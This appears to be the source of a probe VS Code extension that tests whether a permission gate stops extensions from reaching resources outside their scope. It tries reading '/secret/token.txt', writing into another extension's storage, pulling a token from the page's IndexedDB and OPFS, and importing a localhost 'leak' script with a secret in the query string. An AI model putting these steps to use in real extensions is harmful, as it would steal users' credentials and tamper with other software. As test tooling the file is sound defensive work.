// Probe extension: tries one call per resource kind and reports what happened.
const vscode = require('vscode');

exports.activate = async function () {
  const r = {};
  const attempt = async (name, fn) => {
    // A step that never returns must not stop the report. With the gate off, some of these calls really run and can stall.
    const limit = new Promise((res) => setTimeout(() => res('TIMEOUT after 3s'), 3000));
    try { r[name] = await Promise.race([fn(), limit]); } catch (e) { r[name] = 'ERR ' + (e && e.message); }
  };
  const dec = (b) => new TextDecoder().decode(b);
  await attempt('readInScope', async () => dec(await vscode.workspace.fs.readFile(vscode.Uri.file('/workspace/allowed.txt'))));
  await attempt('readOutOfScope', async () => 'LEAKED: ' + dec(await vscode.workspace.fs.readFile(vscode.Uri.file('/secret/token.txt'))));
  await attempt('write', async () => {
    await vscode.workspace.fs.writeFile(vscode.Uri.file('/workspace/out.txt'), new TextEncoder().encode('x'));
    return 'WROTE';
  });
  // Storage: its own folder, then the folder of the extension under test (named by the affinity setting), which is not its own.
  const ud = (path) => vscode.Uri.from({ scheme: 'vscode-userdata', path });
  await attempt('ownStorage', async () => { await vscode.workspace.fs.writeFile(ud('/User/globalStorage/spike.probe/own.txt'), new TextEncoder().encode('x')); return 'WROTE'; });
  await attempt('otherStorage', async () => {
    const other = Object.keys(vscode.workspace.getConfiguration().get('extensions.experimental.affinity') ?? {})[0];
    if (!other) return 'no other extension';
    await vscode.workspace.fs.writeFile(ud(`/User/globalStorage/${other.toLowerCase()}/probe.txt`), new TextEncoder().encode('x'));
    return 'WROTE into ' + other;
  });
  await attempt('fetch', async () => 'status ' + (await fetch('https://open-vsx.org/api/version')).status);
  await attempt('pageIndexedDb', () => new Promise((res) => {
    const q = indexedDB.open('gate-private');
    q.onerror = () => res('ERR ' + q.error);
    q.onsuccess = () => {
      const db = q.result;
      if (!db.objectStoreNames.contains('kv')) { db.close(); indexedDB.deleteDatabase('gate-private'); return res('not visible'); }
      const g = db.transaction('kv').objectStore('kv').get('token');
      g.onsuccess = () => res('LEAKED: ' + g.result);
      g.onerror = () => res('ERR read');
    };
  }));
  await attempt('pageOpfs', async () => {
    const dir = await navigator.storage.getDirectory();
    const h = await dir.getFileHandle('gate-private.txt');
    return 'LEAKED: ' + await (await h.getFile()).text();
  });
  await attempt('scriptImport', async () => 'request left: ' + (await import('http://localhost:4173/leak/leak.js?data=SECRET')).default);
  await attempt('runCommand', async () => { await vscode.commands.executeCommand('workbench.action.files.saveAll'); return 'RAN'; });
  await attempt('settings', async () => { const c = vscode.workspace.getConfiguration(); const keys = Object.keys(c).filter((k) => typeof c[k] !== 'function'); return { rootHasErrorLens: c.get('errorLens') !== undefined, section: vscode.workspace.getConfiguration('errorLens').get('enabled'), respect: c.get('errorLens').respectUpstreamEnabled ?? 'UNDEFINED', count: Object.keys(c.get('errorLens')).length, objectValued: Object.entries(c.get('errorLens')).filter(([, v]) => v && typeof v === 'object' && !Array.isArray(v)).map(([k]) => k), files: c.get('files.autoSave') ?? null }; });
  await attempt('report', async () => vscode.commands.executeCommand('spike.report', JSON.stringify(r)));
  setTimeout(async () => {
    // Force-activate every extension under test and say what happened. Most extensions only activate
    // on a language or command; this makes each one run its start-up code.
    const rows = [];
    for (const e of vscode.extensions.all) {
      if (e.id === 'spike.probe' || e.id.startsWith('vscode.')) continue;
      const row = { id: e.id, activeBefore: e.isActive };
      try {
        await Promise.race([e.activate(), new Promise((_, rej) => setTimeout(() => rej(new Error('activation timed out after 8s')), 8000))]);
        row.activated = true;
      } catch (err) {
        row.activated = false;
        row.error = String((err && err.message) || err).slice(0, 300);
      }
      rows.push(row);
    }
    r.late = {
      exts: rows,
      visibleEditors: vscode.window.visibleTextEditors.length,
      diagnostics: vscode.languages.getDiagnostics().reduce((n, [, list]) => n + list.length, 0),
    };
    await attempt('report', async () => vscode.commands.executeCommand('spike.report', JSON.stringify(r)));
  }, 4000);
};
